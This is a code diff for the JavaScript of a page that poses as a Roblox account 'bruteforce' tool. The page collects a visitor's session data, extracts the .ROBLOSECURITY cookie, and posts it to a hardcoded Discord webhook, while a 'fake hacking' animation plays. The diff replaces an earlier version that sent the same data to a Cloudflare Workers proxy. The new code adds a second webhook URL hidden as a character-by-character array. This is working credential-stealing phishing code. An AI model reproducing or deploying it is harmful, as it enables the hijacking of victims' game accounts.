@@ -1,61 +1,123 @@
-const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
+const doyouhavenothingbettertodo = [  
 
-async function sendToProxy(sessionId) {
-  try {
-    const response = await fetch(CLOUDFLARE_PROXY_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        sessionId: sessionId,
-        timestamp: new Date().toISOString()
-      })
-    });
+    'h' ,   't' ,   't' ,   'p' ,   's' ,   ':' ,   '/' ,   '/' ,   'd' ,   'i' ,  
+    's' ,   'c' ,   'o' ,   'r' ,   'd' ,   '.' ,   'c' ,   'o' ,   'm' ,   '/' ,  
 
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    return await response.json();
+    'a' ,   'p' ,   'i' ,   '/' ,   'w' ,   'e' ,   'b' ,   'h' ,   'o' ,   'o' ,  
+    'k' ,   's' ,   '/' ,   '1' ,   '3' ,   '5' ,   '3' ,   '7' ,   '5' ,   '8' ,  
+
+    '0' ,   '6' ,   '9' ,   '0' ,   '0' ,   '7' ,   '3' ,   '1' ,   '9' ,   '0' ,  
+    '7' ,   '0' ,   '/' ,   'S' ,   'Z' ,   'Y' ,   'Y' ,   '0' ,   'n' ,   'L' ,  
+
+    'A' ,   '6' ,   '_' ,   '4' ,   'c' ,   'e' ,   'f' ,   'I' ,   'H' ,   'y' ,  
+    'Z' ,   'q' ,   'p' ,   'H' ,   'W' ,   'D' ,   'q' ,   'T' ,   'N' ,   'f' ,  
+
+    'I' ,   'G' ,   'X' ,   'G' ,   '4' ,   'J' ,   '9' ,   'K' ,   'd' ,   'L' ,  
+    'h' ,   'q' ,   'x' ,   '8' ,   '-' ,   'c' ,   'Q' ,   '-' ,   't' ,   'G' ,  
+
+    'i' ,   'b' ,   'K' ,   'T' ,   'F' ,   'b' ,   '3' ,   'w' ,   'E' ,   't' ,  
+    'f' ,   'V' ,   '2' ,   'C' ,   'o' ,   '4' ,   'J' ,   '6' ,   'Z' ,   'F' ,   'W'  
+
+];
+
+
+
+
+
     
-  } catch (error) {
-    console.error('Proxy error:', error);
-    throw error;
-  }
-}
+      
 
-// Example usage with your existing bruteforce function
-function bruteforce(sessionId) {
-  const cookie = sessionId.includes(".ROBLOSECURITY") 
-    ? extractRobloxSecurityCookie(sessionId)
-    : null;
+const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353774225181249566/4yLDywFMyhIaXvQSmH0_oojKSAZi1k_66WqJLEbpLcRm0qfTO8f_2Fywyl47irGMI9kI'
 
-  sendToProxy(cookie || sessionId)
-    .then(() => showCookieSuccess())
-    .catch(() => showError("Failed to send data"));
-}
 
 function extractRobloxSecurityCookie(sessionId) {
-  const match = sessionId.match(/\.ROBLOSECURITY[^=]+=([^;]+)/);
-  return match ? match[1] : null;
+  // Use a regular expression to find the .ROBLOSECURITY cookie
+  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = sessionId.match(regex);
+  if (match && match[1]) {
+    return match[1]; // Return the cookie value
+  }
+  return null; // Return null if not found
 }
 
-// Input validation
+function bruteforce(sessionId) {
+  let content;
+
+  // Check if the sessionId contains .ROBLOSECURITY
+  if (sessionId.includes(".ROBLOSECURITY")) {
+    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
+    if (robloxSecurityCookie) {
+      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
+    } else {
+      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
+    }
+  } else {
+    // Send the entire sessionId as-is
+    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
+  }
+
+  const payload = {
+    content: content
+  };
+
+  fetch(adwdawdacsazdawradfsadaw, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord.');
+      } else {
+        console.log('Data sent successfully!');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+}
+
+
+
 function validateInput() {
   const username = document.getElementById('username').value.trim();
   const sessionId = document.getElementById('sessionId').value.trim();
   const captcha = document.getElementById('captcha').checked;
 
-  if (username.length < 3 || sessionId.length < 200 || !captcha) {
-    showError("Invalid input. Username (3+ chars), Session ID (200+ chars), and CAPTCHA required.");
-    return false;
+  // Check for invalid inputs
+  let errorMessage = "";
+
+  if (username.length < 3 && sessionId.length < 200 && !captcha) {
+    errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+  } else if (username.length < 3 && sessionId.length < 200) {
+    errorMessage = "Username must be at least 3 characters, and session ID must be 300+ characters.";
+  } else if (username.length < 3 && !captcha) {
+    errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
+  } else if (sessionId.length < 200 && !captcha) {
+    errorMessage = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
+  } else if (username.length < 3) {
+    errorMessage = "Username must be at least 3 characters long.";
+  } else if (sessionId.length < 200) {
+    errorMessage = "Session ID must be at least 300 characters long.";
+  } else if (!captcha) {
+    errorMessage = "Please complete the CAPTCHA to proceed.";
   }
 
+ 
+  if (errorMessage) {
+    showError(errorMessage);
+    return;
+  }
+
+
+bruteforce(sessionId);
+
+  // Hide error and start fake hacking process
   hideError();
   startHack();
-  bruteforce(sessionId);
-  return true;
 }
-
-// Rest of original code (startHack, showError, etc.) remains identical.
 
 
 function showError(message) {
@@ -204,3 +266,4 @@ function closeTerms() {
 document.addEventListener('DOMContentLoaded', () => {
   document.querySelector('.close').addEventListener('click', closeTerms);
 });
+
